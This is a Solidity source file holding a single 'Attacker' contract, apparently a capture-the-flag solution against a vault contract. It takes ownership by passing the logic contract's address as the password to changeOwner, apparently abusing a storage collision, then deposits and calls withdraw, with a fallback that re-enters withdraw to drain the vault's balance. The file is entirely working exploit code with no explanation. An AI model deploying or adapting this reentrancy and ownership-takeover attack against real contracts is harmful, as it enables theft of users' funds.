// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Attacker {
    address vaultAddress;
    address logicAddress;

    constructor(address _vaultAddress, address _logicAddress) {
        vaultAddress = _vaultAddress;
        logicAddress = _logicAddress;
    }

    function attack() public payable {
        address(vaultAddress).call(abi.encodeWithSignature("changeOwner(bytes32,address)", logicAddress, this));
        // require(
        //     address(vaultAddress).call(abi.encodeWithSignature("owner()")) == address(this), "failed to change owner"
        // );
        address(vaultAddress).call{value: msg.value}(abi.encodeWithSignature("deposite()"));
        address(vaultAddress).call(abi.encodeWithSignature("openWithdraw()"));
        address(vaultAddress).call(abi.encodeWithSignature("withdraw()"));
    }

    fallback() external payable {
        if (address(vaultAddress).balance > 0) {
            address(vaultAddress).call(abi.encodeWithSignature("withdraw()"));
        }
    }
}
